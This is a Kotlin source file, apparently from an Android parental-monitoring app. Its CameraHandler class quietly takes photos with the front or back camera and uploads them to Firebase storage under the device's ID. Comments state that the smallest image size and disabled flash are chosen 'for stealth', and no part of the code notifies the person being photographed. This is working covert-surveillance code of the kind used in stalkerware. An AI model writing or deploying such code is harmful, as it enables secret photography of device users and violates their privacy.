package com.parentkidsapp.kids

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.graphics.Matrix
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Size
import android.view.Surface
import com.parentkidsapp.models.CameraCapture
import com.parentkidsapp.models.CameraType
import com.parentkidsapp.services.FirebaseService
import com.parentkidsapp.utils.PreferenceManager
import java.io.ByteArrayOutputStream
import java.nio.ByteBuffer
import java.util.*

class CameraHandler(
    private val context: Context,
    private val firebaseService: FirebaseService
) {
    
    private var cameraManager: CameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null
    private var preferenceManager = PreferenceManager(context)
    
    fun captureImage(cameraType: CameraType, callback: (Boolean, String?) -> Unit) {
        startBackgroundThread()
        
        try {
            val cameraId = getCameraId(cameraType)
            if (cameraId == null) {
                callback(false, null)
                return
            }
            
            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val outputSizes = map?.getOutputSizes(ImageFormat.JPEG)
            
            if (outputSizes == null || outputSizes.isEmpty()) {
                callback(false, null)
                return
            }
            
            // Use smallest size for stealth and efficiency
            val size = outputSizes.minByOrNull { it.width * it.height } ?: outputSizes[0]
            
            val imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
            
            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                if (image != null) {
                    processImage(image, cameraType, callback)
                    image.close()
                }
                reader.close()
                stopBackgroundThread()
            }, backgroundHandler)
            
            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    captureStillPicture(camera, imageReader, cameraType)
                }
                
                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    callback(false, null)
                    stopBackgroundThread()
                }
                
                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    callback(false, null)
                    stopBackgroundThread()
                }
            }, backgroundHandler)
            
        } catch (e: SecurityException) {
            callback(false, null)
            stopBackgroundThread()
        } catch (e: Exception) {
            callback(false, null)
            stopBackgroundThread()
        }
    }
    
    private fun getCameraId(cameraType: CameraType): String? {
        try {
            for (cameraId in cameraManager.cameraIdList) {
                val characteristics = cameraManager.getCameraCharacteristics(cameraId)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                
                when (cameraType) {
                    CameraType.FRONT -> {
                        if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                            return cameraId
                        }
                    }
                    CameraType.BACK -> {
                        if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                            return cameraId
                        }
                    }
                }
            }
        } catch (e: Exception) {
            return null
        }
        return null
    }
    
    private fun captureStillPicture(camera: CameraDevice, imageReader: ImageReader, cameraType: CameraType) {
        try {
            val captureRequestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureRequestBuilder.addTarget(imageReader.surface)
            
            // Set capture parameters for stealth operation
            captureRequestBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
            captureRequestBuilder.set(CaptureRequest.FLASH_MODE, CameraMetadata.FLASH_MODE_OFF)
            captureRequestBuilder.set(CaptureRequest.NOISE_REDUCTION_MODE, CameraMetadata.NOISE_REDUCTION_MODE_FAST)
            
            camera.createCaptureSession(
                listOf(imageReader.surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        try {
                            session.capture(
                                captureRequestBuilder.build(),
                                object : CameraCaptureSession.CaptureCallback() {
                                    override fun onCaptureCompleted(
                                        session: CameraCaptureSession,
                                        request: CaptureRequest,
                                        result: TotalCaptureResult
                                    ) {
                                        session.close()
                                        camera.close()
                                    }
                                },
                                backgroundHandler
                            )
                        } catch (e: Exception) {
                            session.close()
                            camera.close()
                        }
                    }
                    
                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        session.close()
                        camera.close()
                    }
                },
                backgroundHandler
            )
        } catch (e: Exception) {
            camera.close()
        }
    }
    
    private fun processImage(image: Image, cameraType: CameraType, callback: (Boolean, String?) -> Unit) {
        try {
            val buffer: ByteBuffer = image.planes[0].buffer
            val bytes = ByteArray(buffer.remaining())
            buffer.get(bytes)
            
            // Upload image to Firebase Storage
            val deviceId = preferenceManager.getDeviceId() ?: return
            val path = "captures/$deviceId/${cameraType.name.lowercase()}"
            
            firebaseService.uploadImage(bytes, path) { success, imageUrl ->
                if (success && imageUrl != null) {
                    // Save capture metadata
                    val capture = CameraCapture(
                        id = UUID.randomUUID().toString(),
                        deviceId = deviceId,
                        cameraType = cameraType,
                        imageUrl = imageUrl,
                        timestamp = Date()
                    )
                    
                    firebaseService.saveCameraCapture(capture)
                    callback(true, imageUrl)
                } else {
                    callback(false, null)
                }
            }
        } catch (e: Exception) {
            callback(false, null)
        }
    }
    
    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
        backgroundHandler = Handler(backgroundThread?.looper!!)
    }
    
    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        try {
            backgroundThread?.join()
            backgroundThread = null
            backgroundHandler = null
        } catch (e: InterruptedException) {
            // Handle interruption
        }
    }
}

